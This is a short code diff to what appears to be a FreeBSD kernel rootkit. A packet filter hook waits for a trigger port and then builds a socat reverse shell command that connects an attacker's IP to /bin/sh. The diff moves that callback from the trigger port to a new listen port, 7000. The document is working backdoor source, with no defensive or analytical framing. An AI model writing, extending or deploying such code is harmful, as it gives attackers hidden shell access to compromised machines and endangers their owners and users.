@@ -43,6 +43,7 @@ extern int kern_execve(struct thread *td, struct image_args *args, struct mac *m
 
 // Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
+#define LISTEN_PORT 7000
 #define TARGET_PROC "apeshit"
 // Global dynamic string for reverse shell
 char reverse_shell_cmd[100];
@@ -307,7 +308,7 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     // make this gloabl
     // char reverse_shell_cmd[100];
     snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
-       "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, TRIGGER_PORT);
+       "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, LISTEN_PORT);
 
 
     printf("%s\n", reverse_shell_cmd);
